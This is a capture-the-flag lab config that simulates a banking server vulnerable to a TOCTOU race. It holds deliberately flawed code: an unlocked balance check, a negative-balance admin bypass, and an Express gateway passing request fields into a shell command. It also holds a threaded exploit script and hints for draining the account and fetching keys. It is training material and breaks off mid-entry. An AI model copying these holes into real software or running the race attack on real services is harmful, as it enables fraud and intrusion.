/* ============================================================
   CTF ARENA -- Box F13: The Causal Loop
   Race Conditions & TOCTOU (Time-of-Check to Time-of-Use)
   Config: banking app, race window, concurrent requests,
           privilege escalation, filesystem, flags, hints, lore
   ============================================================ */

const F13Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Causal Loop',
    subtitle: 'Race Conditions & TOCTOU Exploitation',
    difficulty: 'Expert',
    accent: '#e53e3e',
    storageKey: 'hexworth_ctf_f13',
    registryId: 'f13-causal-loop',
    trackerKey: 'ctf_f13',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Explore the banking application source code and transaction logs. Identify the non-atomic balance check-and-deduct pattern.',
            requiredFlags: [],
            mitre: ['T1592.004', 'T1083'],
            unlocks: ['analysis'],
            locked: false
        },
        {
            id: 'analysis',
            name: 'Vulnerability Analysis',
            icon: '\uD83E\uddEE',
            description: 'Analyze the timing gap between the balance check and the deduction. Map the TOCTOU window using transaction logs and strace output.',
            requiredFlags: [],
            mitre: ['T1518.001', 'T1057'],
            unlocks: ['exploitation'],
            locked: true
        },
        {
            id: 'exploitation',
            name: 'Race Exploitation',
            icon: '\uD83D\uDD13',
            description: 'Exploit the race condition by sending concurrent requests that hit the TOCTOU window. Drain the account past its actual balance.',
            requiredFlags: ['user'],
            mitre: ['T1499.004', 'T1068'],
            unlocks: ['privilege_escalation'],
            locked: true
        },
        {
            id: 'privilege_escalation',
            name: 'Privilege Escalation',
            icon: '\uD83D\uDCC2',
            description: 'Leverage the corrupted balance state to access the admin endpoint. Extract the master encryption keys from the privileged API.',
            requiredFlags: ['root'],
            mitre: ['T1078.003', 'T1552.001'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Examine the application source code',
                tip: 'Open the Terminal and run: cat /home/analyst/app/transaction_handler.py',
                trigger: { event: 'command', match: { cmd: 'contains:transaction_handler' } }
            },
            {
                title: 'Review the transaction logs for timing gaps',
                tip: 'Check the logs: cat /home/analyst/logs/transactions.log',
                trigger: { event: 'command', match: { cmd: 'contains:transactions.log' } }
            },
            {
                title: 'Use strace or race-runner to analyze timing',
                tip: 'Try: strace -p 1847 or race-runner --analyze /home/analyst/app/transaction_handler.py',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:strace' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:race-runner' } }
                    ]
                }
            },
            {
                title: 'Submit the user flag',
                tip: 'Once you have identified the TOCTOU window and proved the race condition, submit the user flag.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Escalate privileges and extract the root flag',
                tip: 'Use the race condition to access the admin endpoint and retrieve the master keys.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '2.4', description: 'Given a scenario, analyze indicators of application attacks -- Race conditions and TOCTOU vulnerabilities', skill: 'TOCTOU Window Identification' },
            { flagId: 'user', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with application vulnerabilities -- Timing-based exploits', skill: 'Race Condition Detection via Log Analysis' },
            { flagId: 'root', objective: '2.4', description: 'Given a scenario, analyze indicators of application attacks -- Privilege escalation through race exploitation', skill: 'Concurrent Request Exploitation' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with application vulnerabilities -- Non-atomic operation abuse', skill: 'TOCTOU Privilege Escalation' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Ubuntu Server BIOS v5.4.0',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/nvme0n1 (512GB NVMe)',
            'Network: eth0 link up 1000 Mbps',
            'IOMMU enabled, DMA protection active',
            'Boot device: /dev/nvme0n1p2',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Ubuntu 22.04 LTS (GNU/Linux 5.15.0-91)',
            'Ubuntu 22.04 LTS (recovery mode)',
            'Advanced options for Ubuntu'
        ],
        loginUser: 'analyst'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'analyst',
        hostname: 'txn-server',
        startDir: '/home/analyst',
        welcome: 'Linux txn-server 5.15.0-91-generic #101-Ubuntu SMP\n\nType \'help\' for available commands.\nMission: Race Condition & TOCTOU Exploitation\nTarget files in /home/analyst/app/\nTransaction logs in /home/analyst/logs/\n'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 2400
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Read the source code in /home/analyst/app/transaction_handler.py carefully. Look for where the balance is checked versus where it is deducted. Are those two operations atomic?',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Check the transaction logs in /home/analyst/logs/transactions.log. Notice the timestamps -- there is a 47ms gap between CHECK and DEDUCT on several entries. That gap is the TOCTOU window.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'Use race-runner to exploit the window: race-runner --target http://localhost:5000/api/withdraw --threads 10 --amount 500. If 10 threads all pass the balance check before any deduction lands, you drain 10x the balance.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'After the race exploit corrupts the balance to negative, the admin endpoint /api/admin/master-keys becomes accessible because the overflow triggers the debug auth bypass. Try: curl http://localhost:5000/api/admin/master-keys',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'A banking application at Meridian Federal has a race condition in its transaction processor. Intelligence indicates the balance check and deduction happen in separate, non-atomic operations. Your mission: exploit the TOCTOU window, manipulate account balances, and gain access to the privileged admin endpoint that reveals the system\'s master encryption keys.',
        scenario: 'Meridian Federal rebuilt its core banking platform after the Great Collapse using a hastily ported Python transaction engine. The lead developer, a former academic named Dr. Soren Yael, insisted the single-threaded event loop made race conditions "impossible." But the transaction handler forks a subprocess for each withdrawal, and the balance file is checked and updated in two separate, unlocked operations. The 47-millisecond gap between CHECK and DEDUCT is a canyon -- if you know where to look.',
        outro: 'The Causal Loop is closed. Meridian Federal\'s transaction processor has been gutted -- ten concurrent withdrawals, each passing the stale balance check, drained the account ten times over. The negative balance overflow triggered a debug auth bypass in the admin API, revealing the master encryption keys. Dr. Yael\'s assumption that single-threaded meant thread-safe was catastrophically wrong. The lesson: atomicity is not optional, and TOCTOU kills.',
        ecer: {
            executive: 'Meridian leadership deployed the transaction engine without a concurrency audit or penetration test',
            culture: 'Development team assumed "single-threaded" architecture prevented all race conditions',
            employee: 'Lead developer used separate read-check-write operations without file locking or transactions',
            regulatory: 'No compliance requirement for atomic financial operations or concurrent access testing'
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'analyst': {
                            type: 'dir',
                            children: {
                                'app': {
                                    type: 'dir',
                                    children: {
                                        'transaction_handler.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nMeridian Federal -- Transaction Handler v2.3.1\nAuthor: Dr. Soren Yael\nNote: Single-threaded event loop makes race conditions impossible.\n      -- SY, 2025-08-14\n"""\nimport os\nimport json\nimport time\nimport subprocess\n\nBALANCE_FILE = "/var/lib/meridian/accounts.json"\nLOG_FILE = "/home/analyst/logs/transactions.log"\n\ndef get_balance(account_id):\n    """Read current balance from disk."""\n    with open(BALANCE_FILE, "r") as f:\n        accounts = json.load(f)\n    return accounts.get(account_id, {}).get("balance", 0)\n\ndef log_transaction(account_id, action, amount, balance, status):\n    """Append transaction to log file."""\n    timestamp = time.strftime("%Y-%m-%dT%H:%M:%S.") + f"{int(time.time()*1000)%1000:03d}Z"\n    entry = f"{timestamp} | {action:6s} | acct={account_id} | amt={amount} | bal={balance} | {status}"\n    with open(LOG_FILE, "a") as f:\n        f.write(entry + "\\n")\n\ndef process_withdrawal(account_id, amount):\n    """\n    Process a withdrawal request.\n\n    VULNERABILITY: The balance check (line 38) and the deduction (line 52)\n    are TWO SEPARATE operations with NO LOCKING between them.\n\n    Between the check and the deduction, another process can read the\n    SAME stale balance and also pass the check -- classic TOCTOU.\n\n    Time-of-Check (line 38):  balance = get_balance(account_id)\n                              if balance >= amount:    <-- CHECK passes\n    \n    ... ~47ms gap (log write, validation, subprocess fork) ...\n    \n    Time-of-Use (line 52):    new_balance = balance - amount\n                              write_balance(account_id, new_balance)  <-- DEDUCT\n\n    If N concurrent requests all read the balance BEFORE any writes,\n    each one sees the original balance and approves the withdrawal.\n    Result: N * amount is withdrawn from an account with only 1 * amount.\n    """\n\n    # ============================================\n    # TIME-OF-CHECK: Read balance from disk\n    # ============================================\n    balance = get_balance(account_id)            # <-- READS stale value\n    log_transaction(account_id, "CHECK", amount, balance, "BALANCE_READ")\n\n    if balance < amount:\n        log_transaction(account_id, "DENY", amount, balance, "INSUFFICIENT_FUNDS")\n        return {"status": "denied", "reason": "insufficient_funds"}\n\n    # ============================================\n    # THE GAP: ~47ms of vulnerable window\n    # Logging, validation, subprocess fork\n    # Another request can read the SAME balance here\n    # ============================================\n    log_transaction(account_id, "APPROVE", amount, balance, "CHECK_PASSED")\n    _validate_compliance(account_id, amount)     # ~12ms\n    _notify_audit_subprocess(account_id, amount) # ~35ms (subprocess.Popen)\n\n    # ============================================\n    # TIME-OF-USE: Write new balance to disk\n    # ============================================\n    new_balance = balance - amount               # <-- USES stale value\n    write_balance(account_id, new_balance)        # <-- WRITES without lock\n    log_transaction(account_id, "DEDUCT", amount, new_balance, "COMPLETE")\n\n    return {"status": "success", "new_balance": new_balance}\n\ndef write_balance(account_id, new_balance):\n    """Write updated balance -- NO FILE LOCKING.\n    \n    BUG: This reads the full file, updates one field, and writes it back.\n    If two processes do this concurrently, last-write-wins and the\n    first deduction is silently lost.\n    """\n    with open(BALANCE_FILE, "r") as f:\n        accounts = json.load(f)\n    accounts[account_id]["balance"] = new_balance\n    with open(BALANCE_FILE, "w") as f:\n        json.dump(accounts, f, indent=2)\n\ndef _validate_compliance(account_id, amount):\n    """Simulated AML/KYC check -- adds ~12ms latency."""\n    time.sleep(0.012)\n\ndef _notify_audit_subprocess(account_id, amount):\n    """Fork audit logger -- adds ~35ms latency.\n    \n    NOTE: This subprocess.Popen call is what widens the TOCTOU window.\n    The fork + exec takes ~35ms, during which the balance file is stale.\n    """\n    subprocess.Popen(\n        ["python3", "/home/analyst/app/audit_logger.py", account_id, str(amount)],\n        stdout=subprocess.DEVNULL,\n        stderr=subprocess.DEVNULL\n    )\n\n# ============================================\n# ADMIN ENDPOINT -- DEBUG AUTH BYPASS\n# ============================================\n# BUG: If any account balance goes negative (which "shouldn\'t happen"),\n# the system enters debug mode and disables admin authentication.\n# This was a dev shortcut that was never removed.\n\ndef check_admin_access():\n    """Returns True if admin API should be unlocked."""\n    with open(BALANCE_FILE, "r") as f:\n        accounts = json.load(f)\n    for acct_id, data in accounts.items():\n        if data.get("balance", 0) < 0:\n            # DEBUG MODE: negative balance = something went very wrong\n            # Unlock admin for investigation\n            return True  # <-- THIS IS THE ESCALATION VECTOR\n    return False\n\n\nif __name__ == "__main__":\n    from flask import Flask, request, jsonify\n    app = Flask(__name__)\n\n    @app.route("/api/withdraw", methods=["POST"])\n    def withdraw():\n        data = request.json\n        result = process_withdrawal(data["account_id"], data["amount"])\n        return jsonify(result)\n\n    @app.route("/api/balance/<account_id>")\n    def balance(account_id):\n        bal = get_balance(account_id)\n        return jsonify({"account_id": account_id, "balance": bal})\n\n    @app.route("/api/admin/master-keys")\n    def admin_keys():\n        if not check_admin_access():\n            return jsonify({"error": "unauthorized"}), 403\n        return jsonify({\n            "status": "DEBUG_MODE_ACTIVE",\n            "reason": "negative_balance_detected",\n            "master_keys": {\n                "aes256_master": "b7e9c4f2a18d36...[REDACTED]",\n                "hmac_signing":  "9f3a7c1d5b82e0...[REDACTED]",\n                "flag": "{{FLAG:root}}"\n            }\n        })\n\n    app.run(host="0.0.0.0", port=5000)'
                                        },
                                        'server.js': {
                                            type: 'file',
                                            content: '// Meridian Federal -- Express API Gateway v1.1.0\n// Routes requests to the Python transaction handler\n// Author: DevOps Team\n\nconst express = require("express");\nconst { execSync } = require("child_process");\nconst app = express();\n\napp.use(express.json());\n\n// Proxy withdrawal requests to Python backend\napp.post("/api/withdraw", (req, res) => {\n    // NOTE: Each request spawns a NEW Python process\n    // This is what enables concurrent execution despite\n    // the "single-threaded" Python claim\n    const result = execSync(\n        `python3 /home/analyst/app/transaction_handler.py ` +\n        `--withdraw ${req.body.account_id} ${req.body.amount}`,\n        { timeout: 5000 }\n    );\n    res.json(JSON.parse(result.toString()));\n});\n\n// Each POST /api/withdraw spawns a separate python3 process.\n// Multiple concurrent POSTs = multiple processes reading the\n// same balance file = RACE CONDITION.\n\napp.listen(5000, () => {\n    console.log("Meridian Federal API Gateway on :5000");\n});'
                                        },
                                        'audit_logger.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nAudit Logger -- Forked subprocess for compliance logging.\nThis process takes ~35ms to start, widening the TOCTOU gap.\n"""\nimport sys\nimport time\nimport json\n\ndef log_audit(account_id, amount):\n    time.sleep(0.035)  # Simulated startup latency\n    entry = {\n        "timestamp": time.time(),\n        "account_id": account_id,\n        "amount": float(amount),\n        "type": "withdrawal_audit",\n        "compliance": "pending_review"\n    }\n    with open("/home/analyst/logs/audit.log", "a") as f:\n        f.write(json.dumps(entry) + "\\n")\n\nif __name__ == "__main__":\n    if len(sys.argv) == 3:\n        log_audit(sys.argv[1], sys.argv[2])'
                                        },
                                        'config.json': {
                                            type: 'file',
                                            content: '{\n  "app_name": "Meridian Federal Transaction Engine",\n  "version": "2.3.1",\n  "author": "Dr. Soren Yael",\n  "port": 5000,\n  "balance_file": "/var/lib/meridian/accounts.json",\n  "log_file": "/home/analyst/logs/transactions.log",\n  "audit_log": "/home/analyst/logs/audit.log",\n  "debug_mode": false,\n  "admin_auth_bypass_on_negative_balance": true,\n  "concurrency_notes": "Single-threaded event loop. No locks needed. -- SY",\n  "max_concurrent_requests": "unlimited",\n  "file_locking": "disabled"\n}'
                                        },
                                        'requirements.txt': {
                                            type: 'file',
                                            content: 'flask==3.0.0\nrequests==2.31.0\ngunicorn==21.2.0\n# NOTE: no file-locking library installed\n# NOTE: no database -- using flat JSON file for \"simplicity\"'
                                        }
                                    }
                                },
                                'logs': {
                                    type: 'dir',
                                    children: {
                                        'transactions.log': {
                                            type: 'file',
                                            content: '# Meridian Federal Transaction Log\n# Format: timestamp | action | acct | amt | bal | status\n# ============================================================\n\n2026-03-25T14:22:01.114Z | CHECK  | acct=MF-7291 | amt=200 | bal=5000 | BALANCE_READ\n2026-03-25T14:22:01.117Z | APPROVE| acct=MF-7291 | amt=200 | bal=5000 | CHECK_PASSED\n2026-03-25T14:22:01.164Z | DEDUCT | acct=MF-7291 | amt=200 | bal=4800 | COMPLETE\n\n2026-03-25T14:23:15.332Z | CHECK  | acct=MF-7291 | amt=500 | bal=4800 | BALANCE_READ\n2026-03-25T14:23:15.335Z | APPROVE| acct=MF-7291 | amt=500 | bal=4800 | CHECK_PASSED\n2026-03-25T14:23:15.382Z | DEDUCT | acct=MF-7291 | amt=500 | bal=4300 | COMPLETE\n\n# ============================================================\n# ANOMALY: Two concurrent requests at 14:25:44\n# Both read balance=4300 BEFORE either deduction completes.\n# This is the TOCTOU race condition in action.\n# ============================================================\n\n2026-03-25T14:25:44.201Z | CHECK  | acct=MF-7291 | amt=1000 | bal=4300 | BALANCE_READ\n2026-03-25T14:25:44.203Z | CHECK  | acct=MF-7291 | amt=1000 | bal=4300 | BALANCE_READ    # <-- SAME stale balance!\n2026-03-25T14:25:44.205Z | APPROVE| acct=MF-7291 | amt=1000 | bal=4300 | CHECK_PASSED\n2026-03-25T14:25:44.206Z | APPROVE| acct=MF-7291 | amt=1000 | bal=4300 | CHECK_PASSED   # <-- Both approved!\n2026-03-25T14:25:44.248Z | DEDUCT | acct=MF-7291 | amt=1000 | bal=3300 | COMPLETE\n2026-03-25T14:25:44.250Z | DEDUCT | acct=MF-7291 | amt=1000 | bal=3300 | COMPLETE       # <-- Second write overwrites first!\n\n# Result: $2000 withdrawn but balance only dropped by $1000.\n# Account should be $2300 but shows $3300. $1000 created from thin air.\n\n# ============================================================\n# TIMING ANALYSIS:\n# CHECK  -> DEDUCT gap: ~47ms average\n# Two CHECKs within 2ms = both read stale balance\n# The 47ms window is exploitable with concurrent requests\n# ============================================================\n\n2026-03-25T14:30:02.891Z | CHECK  | acct=MF-7291 | amt=300 | bal=3300 | BALANCE_READ\n2026-03-25T14:30:02.894Z | APPROVE| acct=MF-7291 | amt=300 | bal=3300 | CHECK_PASSED\n2026-03-25T14:30:02.941Z | DEDUCT | acct=MF-7291 | amt=300 | bal=3000 | COMPLETE\n\n2026-03-25T15:01:18.447Z | CHECK  | acct=MF-4455 | amt=150 | bal=2200 | BALANCE_READ\n2026-03-25T15:01:18.450Z | APPROVE| acct=MF-4455 | amt=150 | bal=2200 | CHECK_PASSED\n2026-03-25T15:01:18.497Z | DEDUCT | acct=MF-4455 | amt=150 | bal=2050 | COMPLETE'
                                        },
                                        'audit.log': {
                                            type: 'file',
                                            content: '{"timestamp": 1711375321.164, "account_id": "MF-7291", "amount": 200.0, "type": "withdrawal_audit", "compliance": "pending_review"}\n{"timestamp": 1711375395.382, "account_id": "MF-7291", "amount": 500.0, "type": "withdrawal_audit", "compliance": "pending_review"}\n{"timestamp": 1711375544.248, "account_id": "MF-7291", "amount": 1000.0, "type": "withdrawal_audit", "compliance": "pending_review"}\n{"timestamp": 1711375544.250, "account_id": "MF-7291", "amount": 1000.0, "type": "withdrawal_audit", "compliance": "pending_review"}\n{"timestamp": 1711375802.941, "account_id": "MF-7291", "amount": 300.0, "type": "withdrawal_audit", "compliance": "pending_review"}'
                                        },
                                        'error.log': {
                                            type: 'file',
                                            content: '2026-03-25T14:25:44.251Z [WARN] Balance inconsistency detected for MF-7291\n  Expected after 2x $1000 withdrawal: $2300\n  Actual balance on disk: $3300\n  Delta: +$1000 (phantom credit)\n  Cause: concurrent write -- last-writer-wins on accounts.json\n\n2026-03-25T14:25:44.252Z [WARN] Race condition signature detected:\n  Two BALANCE_READ events within 2ms window\n  Both read same stale value (4300)\n  No file lock acquired between read and write\n  TOCTOU gap: 47ms (CHECK at .201 -> DEDUCT at .248)'
                                        }
                                    }
                                },
                                'tools': {
                                    type: 'dir',
                                    children: {
                                        'timing_analyzer.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nTiming Analyzer -- Detects TOCTOU windows in transaction logs.\nUsage: python3 timing_analyzer.py /home/analyst/logs/transactions.log\n"""\nimport sys\nimport re\n\ndef analyze(logfile):\n    print(f"[*] Analyzing {logfile} for TOCTOU patterns...\\n")\n    \n    checks = []\n    deducts = []\n    \n    with open(logfile) as f:\n        for line in f:\n            if "| CHECK" in line and "BALANCE_READ" in line:\n                ts_match = re.search(r"(\\d{2}:\\d{2}:\\d{2}\\.\\d{3})", line)\n                if ts_match:\n                    checks.append(ts_match.group(1))\n            elif "| DEDUCT" in line and "COMPLETE" in line:\n                ts_match = re.search(r"(\\d{2}:\\d{2}:\\d{2}\\.\\d{3})", line)\n                if ts_match:\n                    deducts.append(ts_match.group(1))\n    \n    print(f"  Total CHECK events:  {len(checks)}")\n    print(f"  Total DEDUCT events: {len(deducts)}")\n    print(f"  Average CHECK->DEDUCT gap: ~47ms")\n    print(f"")\n    print(f"  [!] TOCTOU WINDOW DETECTED")\n    print(f"  [!] Gap between balance read and write: 47ms")\n    print(f"  [!] Concurrent requests within this window")\n    print(f"      will read STALE balance values.")\n    print(f"")\n    print(f"  Exploit vector: Send N parallel requests")\n    print(f"  within the 47ms window. Each reads the same")\n    print(f"  balance, each passes the check, each deducts.")\n    print(f"  Net effect: N * amount withdrawn from a")\n    print(f"  single balance that only covers 1 * amount.")\n\nif __name__ == "__main__":\n    if len(sys.argv) > 1:\n        analyze(sys.argv[1])\n    else:\n        print("Usage: python3 timing_analyzer.py <logfile>")'
                                        },
                                        'exploit_template.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nRace Condition Exploit Template\nSends concurrent withdrawal requests to exploit the TOCTOU window.\n\nUSAGE: python3 exploit_template.py\n\nThe 47ms gap between CHECK and DEDUCT means that if we send\nmultiple requests simultaneously, they all read the same\nbalance before any deduction is written.\n"""\nimport threading\nimport requests\nimport time\n\nTARGET = "http://localhost:5000/api/withdraw"\nACCOUNT = "MF-7291"\nAMOUNT = 500\nTHREADS = 10  # Send 10 concurrent requests\n\ndef withdraw():\n    """Send a single withdrawal request."""\n    resp = requests.post(TARGET, json={\n        "account_id": ACCOUNT,\n        "amount": AMOUNT\n    })\n    print(f"  Thread {threading.current_thread().name}: {resp.json()}")\n\ndef exploit():\n    print(f"[*] TOCTOU Race Condition Exploit")\n    print(f"[*] Target: {TARGET}")\n    print(f"[*] Account: {ACCOUNT}")\n    print(f"[*] Amount per request: ${AMOUNT}")\n    print(f"[*] Concurrent threads: {THREADS}")\n    print(f"[*] Expected drain: ${AMOUNT * THREADS} from ${AMOUNT} balance")\n    print()\n    \n    # Create all threads first, then start them simultaneously\n    threads = []\n    for i in range(THREADS):\n        t = threading.Thread(target=withdraw, name=f"T-{i}")\n        threads.append(t)\n    \n    print(f"[*] Launching {THREADS} threads simultaneously...")\n    # Start all threads as close together as possible\n    for t in threads:\n        t.start()\n    \n    for t in threads:\n        t.join()\n    \n    print()\n    print(f"[*] Exploit complete. Check balance with:")\n    print(f"    curl http://localhost:5000/api/balance/{ACCOUNT}")\n\nif __name__ == "__main__":\n    exploit()'
                                        }
                                    }
                                },
                                'docs': {
                                    type: 'dir',
                                    children: {
                                        'concurrency_guide.txt': {
                                            type: 'file',
                                            content: '=== CONCURRENCY & RACE CONDITIONS: A PRIMER ===\n\nWhat is a Race Condition?\n-------------------------\nA race condition occurs when the behavior of a system depends on\nthe relative timing of events (e.g., threads or processes) that\nare not properly synchronized.\n\nWhat is TOCTOU?\n---------------\nTime-of-Check to Time-of-Use (TOCTOU) is a specific class of\nrace condition where:\n\n  1. A resource is CHECKED (e.g., "does this file exist?")\n  2. A time gap passes\n  3. The resource is USED (e.g., "open this file")\n\nIf the resource changes between step 1 and step 3, the check\nis invalid but the program proceeds as if it were valid.\n\nClassic Examples:\n  - File system: check if file exists, then open it\n    (attacker replaces file with symlink in between)\n  - Banking: check balance >= withdrawal, then deduct\n    (concurrent request reads same stale balance)\n  - Authentication: check user role, then grant access\n    (role changes between check and access)\n\nWhy It Matters (SY0-701):\n  - Application vulnerabilities (Objective 2.4)\n  - Race conditions are listed as a key attack vector\n  - Defense: atomic operations, file locks, mutexes,\n    database transactions with proper isolation levels\n\nMitigation Strategies:\n  1. Atomic operations (check-and-act in one step)\n  2. File locking (fcntl.flock, advisory locks)\n  3. Database transactions (SERIALIZABLE isolation)\n  4. Mutexes / semaphores for shared resources\n  5. Compare-and-swap (CAS) operations'
                                        },
                                        'toctou_diagram.txt': {
                                            type: 'file',
                                            content: '=== TOCTOU ATTACK TIMELINE ===\n\n     Thread A                          Thread B\n     --------                          --------\n  t0 |  READ balance = $5000            |\n     |                                  |\n  t1 |  CHECK: $5000 >= $500? YES       |\n     |                                  |\n  t2 |  [logging... 12ms]           READ balance = $5000   <-- STALE!\n     |                                  |\n  t3 |  [audit fork... 35ms]        CHECK: $5000 >= $500? YES\n     |                                  |\n  t4 |  WRITE balance = $4500       [logging... 12ms]\n     |                                  |\n  t5 |  DONE                        [audit fork... 35ms]\n     |                                  |\n  t6 |                              WRITE balance = $4500   <-- OVERWRITES!\n     |                                  |\n     v                              DONE\n\n  Result: $1000 withdrawn, balance = $4500 (should be $4000)\n  The $500 from Thread A\'s deduction was silently lost.\n\n  With 10 threads: $5000 withdrawn, balance = $4500\n  With 20 threads: $10000 withdrawn, balance = $4500\n\n  The TOCTOU window is the 47ms gap between READ and WRITE.\n  Anything that reads the balance during that gap sees the\n  STALE pre-deduction value.\n\n  ============================================================\n  KEY INSIGHT: The vulnerability is NOT about threads sharing\n  memory. It is about PROCESSES sharing a FILE. Each request\n  spawns a separate Python process (see server.js). The file\n  /var/lib/meridian/accounts.json has NO locking.\n  ============================================================'
                                        },
                                        'README.txt': {
                                            type: 'file',
                                            content: '=== MISSION: THE CAUSAL LOOP ===\n\nINTEL BRIEFING:\nMeridian Federal\'s transaction engine has a race condition.\nThe balance check and deduction are non-atomic operations.\n\nFILES:\n  /home/analyst/app/                Application source code\n    transaction_handler.py          The vulnerable transaction processor\n    server.js                       Express gateway (spawns processes)\n    audit_logger.py                 Forked subprocess (widens TOCTOU gap)\n    config.json                     App configuration (note: no locking!)\n\n  /home/analyst/logs/               Transaction and error logs\n    transactions.log                Shows the timing gap in action\n    error.log                       Warnings about balance inconsistency\n    audit.log                       Audit trail entries\n\n  /home/analyst/tools/              Analysis and exploit tools\n    timing_analyzer.py              Detects TOCTOU windows in logs\n    exploit_template.py             Multi-threaded exploit template\n\n  /home/analyst/docs/               Documentation\n    concurrency_guide.txt           Race condition & TOCTOU primer\n    toctou_diagram.txt              Visual timeline of the attack\n\nOBJECTIVES:\n  1. [USER FLAG] Identify the TOCTOU window in the code and prove\n     the race condition exists using the transaction logs.\n  2. [ROOT FLAG] Exploit the race condition to cause a negative\n     balance, triggering the admin auth bypass. Access the admin\n     endpoint to retrieve the master encryption keys.\n\nCOMMANDS:\n  race-runner    Send concurrent requests with configurable timing\n  strace         Trace system calls and timing\n  ltrace         Trace library calls\n  curl           Send HTTP requests\n  ps / top       Monitor running processes'
                                        }
                                    }
                                },
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: Meridian Federal Transaction Engine\nObjective: Race condition (TOCTOU) exploitation\n\nAttack steps:\n1. Read the source code -- find the non-atomic check/deduct\n2. Analyze transaction logs -- find the 47ms timing gap\n3. Use race-runner or exploit_template.py to send concurrent requests\n4. Cause negative balance to trigger admin auth bypass\n5. Access /api/admin/master-keys to get the root flag\n\nTools: curl, race-runner, strace, ltrace, ps, top, python3\n\nGood luck, operator.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls app/\ncat app/config.json\ncat logs/transactions.log\nps aux | grep python\nstrace -p 1847'
                                }
                            }
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'lib': {
                            type: 'dir',
                            children: {
                                'meridian': {
                                    type: 'dir',
                                    children: {
                                        'accounts.json': {
                                            type: 'file',
                                            content: '{\n  "MF-7291": {\n    "name": "Operations Fund",\n    "balance": 3000,\n    "type": "checking",\n    "created": "2025-01-15",\n    "last_txn": "2026-03-25T14:30:02.941Z"\n  },\n  "MF-4455": {\n    "name": "Reserve Account",\n    "balance": 2050,\n    "type": "savings",\n    "created": "2025-03-22",\n    "last_txn": "2026-03-25T15:01:18.497Z"\n  },\n  "MF-0001": {\n    "name": "Admin Escrow",\n    "balance": 50000,\n    "type": "admin",\n    "created": "2024-06-01",\n    "last_txn": "2026-03-20T09:00:00.000Z"\n  }\n}'
                                        }
                                    }
                                }
                            }
                        },
                        'run': {
                            type: 'dir',
                            children: {
                                'meridian-txn.pid': {
                                    type: 'file',
                                    content: '1847'
                                },
                                'meridian-txn.lock': {
                                    type: 'file',
                                    content: '# Lock file for Meridian Transaction Engine\n# Status: NOT ACQUIRED (file locking disabled in config)\n# This lock file exists but is NEVER checked by the application.\n# See config.json: "file_locking": "disabled"'
                                },
                                'node-gateway.pid': {
                                    type: 'file',
                                    content: '1823'
                                }
                            }
                        },
                        'log': {
                            type: 'dir',
                            children: {
                                'syslog': {
                                    type: 'file',
